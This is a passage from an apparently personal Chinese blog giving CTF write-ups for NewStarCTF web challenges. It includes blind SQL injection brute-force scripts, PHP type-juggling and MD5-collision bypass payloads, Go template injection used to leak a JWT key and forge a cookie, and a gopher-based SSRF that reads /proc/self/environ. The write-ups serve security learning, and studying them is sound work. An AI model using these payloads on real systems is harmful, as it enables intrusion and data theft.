class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">import requests,string,time</span><br><span class="line"></span><br><span class="line">url = &#x27;&#x27;</span><br><span class="line"></span><br><span class="line">result = &#x27;&#x27;</span><br><span class="line">for i in range(1,100):</span><br><span class="line">    print(f&#x27;[+] Bruting at &#123;i&#125;&#x27;)</span><br><span class="line">    for c in string.ascii_letters + string.digits + &#x27;,_-&#123;&#125;&#x27;:</span><br><span class="line">        time.sleep(0.01) # 限制速率，防止请求过快</span><br><span class="line"></span><br><span class="line">        print(&#x27;[+] Trying:&#x27;, c)</span><br><span class="line"></span><br><span class="line">        tables = f&#x27;(Select(group_concat(column_name))from(infOrmation_schema.columns)where((table_name)like(\&#x27;secrets\&#x27;)))&#x27;</span><br><span class="line"></span><br><span class="line">        char = f&#x27;(ord(mid(&#123;tables&#125;,&#123;i&#125;,1)))&#x27;</span><br><span class="line"></span><br><span class="line">        # 爆破该 ascii 值</span><br><span class="line">        b = f&#x27;((&#123;char&#125;)in(&#123;ord(c)&#125;))&#x27;</span><br><span class="line"></span><br><span class="line">        # 若 ascii 猜对了，则 and 后面的结果是 true，会返回 Alice 的数据</span><br><span class="line">        p = f&#x27;Alice\&#x27;and(&#123;b&#125;)#&#x27;</span><br><span class="line"></span><br><span class="line">        res = requests.get(url, params=&#123;&#x27;student_name&#x27;: p&#125;)</span><br><span class="line"></span><br><span class="line">        if &#x27;Alice&#x27; in res.text:</span><br><span class="line">            print(&#x27;[*]bingo:&#x27;,c)</span><br><span class="line">            result += c</span><br><span class="line">            print(result)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,string,time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[+] Bruting at <span class="subst">&#123;i&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> string.ascii_letters + string.digits + <span class="string">&#x27;,_-&#123;&#125;&#x27;</span>:</span><br><span class="line">        time.sleep(<span class="number">0.01</span>) <span class="comment"># 限制速率，防止请求过快</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[+] Trying:&#x27;</span>, c)</span><br><span class="line"></span><br><span class="line">        tables = <span class="string">f&#x27;(Select(group_concat(secret_value))from(secrets)where((secret_value)like(\&#x27;flag%\&#x27;)))&#x27;</span></span><br><span class="line"></span><br><span class="line">        char = <span class="string">f&#x27;(ord(mid(<span class="subst">&#123;tables&#125;</span>,<span class="subst">&#123;i&#125;</span>,1)))&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 爆破该 ascii 值</span></span><br><span class="line">        b = <span class="string">f&#x27;((<span class="subst">&#123;char&#125;</span>)in(<span class="subst">&#123;<span class="built_in">ord</span>(c)&#125;</span>))&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 若 ascii 猜对了，则 and 后面的结果是 true，会返回 Alice 的数据</span></span><br><span class="line">        p = <span class="string">f&#x27;Alice\&#x27;and(<span class="subst">&#123;b&#125;</span>)#&#x27;</span></span><br><span class="line"></span><br><span class="line">        res = requests.get(url, params=&#123;<span class="string">&#x27;student_name&#x27;</span>: p&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Alice&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[*]bingo:&#x27;</span>,c)</span><br><span class="line">            result += c</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>



<p>下面是我用二分跑的代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&#x27;http://127.0.0.1:11930/?student_name=alice\&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">response_1</span>(<span class="params">pos,mid</span>):</span><br><span class="line">    c=<span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            table=<span class="string">f&#x27;AND(ord(MID((SELECT(GROUP_CONCAT(secret_value))FROM(ctf.secrets)WHERE((secret_key)IN(\&#x27;flag\&#x27;))),<span class="subst">&#123;pos&#125;</span>,1))IN(ord(\&#x27;<span class="subst">&#123;c&#125;</span>\&#x27;)))%23#&#x27;</span></span><br><span class="line">            url1=url+table</span><br><span class="line">            response=requests.get(url1,timeout=<span class="number">0.4</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;Alice&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;yes! pos:<span class="subst">&#123;pos&#125;</span> c:<span class="subst">&#123;mid&#125;</span>&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;no! pos:<span class="subst">&#123;pos&#125;</span> c:<span class="subst">&#123;mid&#125;</span>&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">           </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">response_2</span>(<span class="params">pos,mid</span>):</span><br><span class="line">    c=<span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            table=<span class="string">f&#x27;AND(ord(MID((SELECT(GROUP_CONCAT(secret_value))FROM(ctf.secrets)WHERE((secret_key)IN(\&#x27;flag\&#x27;))),<span class="subst">&#123;pos&#125;</span>,1))&gt;(ord(\&#x27;<span class="subst">&#123;c&#125;</span>\&#x27;)))%23#&#x27;</span></span><br><span class="line">            url1=url+table</span><br><span class="line">            response=requests.get(url1,timeout=<span class="number">0.4</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;Alice&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;yes! pos:<span class="subst">&#123;pos&#125;</span> c&gt;<span class="subst">&#123;mid&#125;</span>&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;no! pos:<span class="subst">&#123;pos&#125;</span> c&lt;=<span class="subst">&#123;mid&#125;</span>&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">binary_search</span>(<span class="params">pos</span>):</span><br><span class="line">    <span class="comment"># 定义左右边界</span></span><br><span class="line">    left = <span class="number">31</span></span><br><span class="line">    right = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> left &lt;= right:</span><br><span class="line">        </span><br><span class="line">        mid = (left + right) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> response_1(pos,mid):</span><br><span class="line">            <span class="keyword">return</span> mid  </span><br><span class="line">        <span class="keyword">elif</span> response_2(pos,mid):</span><br><span class="line">                left = mid + <span class="number">1</span> </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right = mid - <span class="number">1</span> </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>  </span><br><span class="line"></span><br><span class="line">str1=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    target=binary_search(pos)</span><br><span class="line">    str1+=<span class="built_in">chr</span>(target)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;flag:<span class="subst">&#123;str1&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(str1))</span><br><span class="line"><span class="built_in">print</span>(str1)</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h1 id="chocolate"><a href="#chocolate" class="headerlink" title="chocolate"></a>chocolate</h1><p>前几步就是考察的php语言特性</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">global</span> <span class="variable">$cocoaLiquor_star</span>;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$what_can_i_say</span>;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;source.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">printf</span>(<span class="string">&quot;什么?想做巧克力? &quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;1337&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;可爱的捏&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]|\./i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;你干嘛&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;orz orz orz&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">1337</span>)&#123;</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&quot;<span class="subst">&#123;$cocoaLiquor_star&#125;</span>\n&quot;</span>);</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&quot;<span class="subst">&#123;$what_can_i_say&#125;</span>\n&quot;</span>);</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&quot;牢师傅如此说到&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以利用八进制进行绕过</p>
<p>payload:</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:24368/0ldStar.php?num=+02471</span><br></pre></td></tr></table></figure>

<p>得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 可可液块 (g): 1337033</span><br><span class="line">// gur arkg yriry vf : pbpbnOhggre_fgne.cuc, try to decode this 牢师傅如此说到</span><br></pre></td></tr></table></figure>

<p>下面是rot13，解码得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">the next level is : cocoaButter_star.php</span><br></pre></td></tr></table></figure>



<p>第二步：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">global</span> <span class="variable">$cocoaButter_star</span>;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$next</span>;</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;source.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cat</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cat&#x27;</span>];</span><br><span class="line"><span class="variable">$dog</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;dog&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$cat</span>) || <span class="title function_ invoke__">is_array</span>(<span class="variable">$dog</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;EZ&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$cat</span> !== <span class="variable">$dog</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$cat</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$dog</span>))&#123;</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;of course you konw&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;ohhh no~&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;moew&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$miao</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;moew&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$miao</span> == <span class="title function_ invoke__">md5</span>(<span class="variable">$miao</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$cocoaButter_star</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;qwq? how?&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$next_level</span> =<span class="variable">$_POST</span>[<span class="string">&#x27;wof&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$next_level</span>) &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$next_level</span>),<span class="number">0</span>,<span class="number">5</span>)===<span class="string">&#x27;8031b&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$next</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>有三小问</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$cat</span>) || <span class="title function_ invoke__">is_array</span>(<span class="variable">$dog</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;EZ&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$cat</span> !== <span class="variable">$dog</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$cat</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$dog</span>))&#123;</span><br></pre></td></tr></table></figure>

<p>可以利用下面的来绕过</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">?cat=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;dog=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">miao == md5($miao)</span><br></pre></td></tr></table></figure>

<p>可以利用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">moew=0e215962017</span><br></pre></td></tr></table></figure>

<p>因为moew经过md5之后还是0e……的格式，因此可以绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($next_level) &amp;&amp; substr(md5($next_level),0,5)===&#x27;8031b&#x27;)&#123;</span><br></pre></td></tr></table></figure>

<p>可以爆破</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10000000</span>):</span><br><span class="line">    s=<span class="built_in">str</span>(i)</span><br><span class="line">    s=hashlib.md5(s.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> s[:<span class="number">5</span>]==<span class="string">&#x27;8031b&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(s)</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;yes&quot;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;finish!&quot;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wof=2306312</span><br></pre></td></tr></table></figure>

<p>final.php最后的反序列化在其他内容提到了，绕过方法就是把chocolate任意一个字符改成大写即可。</p>
<p>之后需要爆破，但是我的爆破代码需要跑很久……</p>
<p>接近一小时了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url=<span class="string">&quot;http://127.0.0.1:29785/verify.php&quot;</span></span><br><span class="line">a=time.time()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1337033</span>):</span><br><span class="line">    power=<span class="built_in">str</span>(i)</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">&quot;cocoaButter&quot;</span>:<span class="string">&quot;202409&quot;</span>,</span><br><span class="line">        <span class="string">&quot;cocoaLiquor&quot;</span>:<span class="string">&quot;1337033&quot;</span>,</span><br><span class="line">        <span class="string">&quot;darkCocoaPowder&quot;</span>:<span class="string">&quot;51540&quot;</span>,</span><br><span class="line">        <span class="string">&quot;powderedSugar&quot;</span>:power</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response=requests.post(url=url,data=data,timeout=<span class="number">0.5</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;好苦&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;i&#125;</span>:no!!!&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(response.text)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;i&#125;</span>:yes!!!&#x27;</span>)</span><br><span class="line">                exit(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">b=time.time()</span><br><span class="line">b-=a</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;time:<span class="subst">&#123;b&#125;</span>s&quot;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">2041:no!!!</span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>背景图片示例<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">style</span>=<span class="string">&quot;background-image: url(&#x27;choco.gif&#x27;); background-size: cover;&quot;</span>&gt;</span></span><br><span class="line">喵喵</span><br><span class="line">这确实是巧克力！flag&#123;NeW5tAr_ctf-2O2A10f6b08c71c2&#125;</span><br><span class="line">bye</span><br><span class="line">2042:yes!!!</span><br></pre></td></tr></table></figure>

<h1 id="ezcmsss"><a href="#ezcmsss" class="headerlink" title="ezcmsss"></a>ezcmsss</h1><p>感觉像是一个正常的web题目</p>
<p>能直接下载到源码<a target="_blank" rel="noopener" href="http://www.zip,wp说是首页源码有提示,结果我是用dirsearch扫出来的/">www.zip，wp说是首页源码有提示，结果我是用dirsearch扫出来的</a></p>
<p>源码是jizhicms的服务，start.sh能看到用户名和密码，并且提示了管理员用户接口admin.php</p>
<p>登录进去之后是管理员界面</p>
<p>网上可以搜到jizhicms在这个版本的文件上传漏洞</p>
<p>基本流程是这样的，使用文件上传可以上传一个压缩包，然后可以发包让控制服务器解压，这样就可以把我们的木马传上去</p>
<p>之后就正常得到flag</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://newstar.wiki/wp/2024/week4/web/ezcmsss.html">https://newstar.wiki/wp/2024/week4/web/ezcmsss.html</a></p>
</blockquote>
<h1 id="PangBai过家家（4）"><a href="#PangBai过家家（4）" class="headerlink" title="PangBai过家家（4）"></a>PangBai过家家（4）</h1><p>go语言模版注入</p>
<p>可以利用</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">&#123;&#123;.User.JwtKey&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>来得到token的密钥，然后就可以伪造Papa用户的Cookie</p>
<p>之后注意到routeFavorite函数里面可以实现篡改sign文件路径，这样就可以任意文件读取了</p>
<p>我做到了这一步，想着可以使用burpsuite发包来实现，结果最后一直显示无法读取文件</p>
<p>看了wp之后才发现我遗漏的东西</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">requestIP := r.RemoteAddr[:strings.LastIndex(r.RemoteAddr, <span class="string">&quot;:&quot;</span>)]</span><br><span class="line">		fmt.Println(<span class="string">&quot;Request IP:&quot;</span>, requestIP)</span><br><span class="line">		<span class="keyword">if</span> requestIP != <span class="string">&quot;127.0.0.1&quot;</span> &amp;&amp; requestIP != <span class="string">&quot;[::1]&quot;</span> &#123;</span><br><span class="line">			w.WriteHeader(http.StatusForbidden)</span><br><span class="line">			w.Write([]<span class="type">byte</span>(<span class="string">&quot;Only localhost can access&quot;</span>))</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>

<p>这段代码限制了只有本机才能访问</p>
<p>（但是我在使用burpsuite发包之后显示也成功篡改了，只是不能读取？按理来说连篡改都不能？我的回复报文相应的也是ok）</p>
<p>于是我们可以利用下面这个函数</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c Helper)</span></span> Curl(url <span class="type">string</span>) <span class="type">string</span> &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;Curl:&quot;</span>, url)</span><br><span class="line">	cmd := exec.Command(<span class="string">&quot;curl&quot;</span>, <span class="string">&quot;-fsSL&quot;</span>, <span class="string">&quot;--&quot;</span>, url)</span><br><span class="line">	_, err := cmd.CombinedOutput()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;Error: curl:&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;error&quot;</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;ok&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ssrf攻击</p>
<p>利用curl开启一个服务</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">&#123;&#123;.Curl <span class="string">&quot;http://localhost:8000&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>之后利用这个服务来发送PUT请求</p>
<p>首先构造PUT报文</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">PUT</span> <span class="string">/favorite</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8000</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/plain</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NTExMDI1MTgsInVzZXIiOiJQYXBhIn0.JuYmj3YXra_eO-ALk9O-_zoiGfNI8-Ip3sOtGK83WcA</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>18</span><br><span class="line"></span><br><span class="line"><span class="language-ruby">/<span class="built_in">proc</span>/<span class="variable language_">self</span>/environ</span></span><br></pre></td></tr></table></figure>

<p>然后使用cyberchef来编码并套上 Gopher 协议</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">&#123;&#123;.Curl <span class="string">&quot;gopher://localhost:8000/_PUT%20%2Ffavorite%20HTTP%2F1%2E1%0D%0AHost%3A%20localhost%3A8000%0D%0AContent%2DType%3A%20text%2Fplain%0D%0ACookie%3A%20token%3DeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9%2EeyJleHAiOjE3NTExMDI1MTgsInVzZXIiOiJQYXBhIn0%2EJuYmj3YXra%5FeO%2DALk9O%2D%5FzoiGfNI8%2DIp3sOtGK83WcA%0D%0AContent%2DLength%3A%2018%0D%0A%0D%0A%2Fproc%2Fself%2Fenviron&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>这样就成功篡改了</p>
<p>最后访问&#x2F;favorite即可得到flag</p>
<h1 id="blindsql2"><a href="#blindsql2" class="headerlink" title="blindsql2"></a>blindsql2</h1><p>注了一个小时注烦了</p>
<p>大概原理就是使用if语句，当真的时候sleep几秒，这样就能判断了</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/qiushuo/p/17485659.html">https://www.cnblogs.com/qiushuo/p/17485659.html</a></p>
</blockquote>
<p>比如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost:8000/?student_name=alice%27and(if((select(count(table_name))from(information_schema.tables)where((table_schema)IN(database())))IN(3),sleep(3),1))%23#</span><br></pre></td></tr></table></figure>

</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">tgrddf55</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/06/08/2025-06-14-newstarCTF-web/">http://example.com/2025/06/08/2025-06-14-newstarCTF-web/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">tgrddf55's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/web/">web</a></div><div class="post_share"><div class="social-share" data-image="/image/35.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2025/06/08/2025-06-08-web%E5%85%A5%E9%97%A8%E9%A2%98%E5%8D%952/" title="web入门题单2"><img class="cover" src="/image/49.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">web入门题单2</div></div></a></div><div class="next-post pull-right"><a href="/2025/06/07/2025-06-07-php%E5%85%A5%E9%97%A8/" title="php study"><img class="cover" src="/image/33.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">php study</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2025/05/30/2025-05-30-js%E5%85%A5%E9%97%A8/" title="js study"><img class="cover" src="/image/9.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far 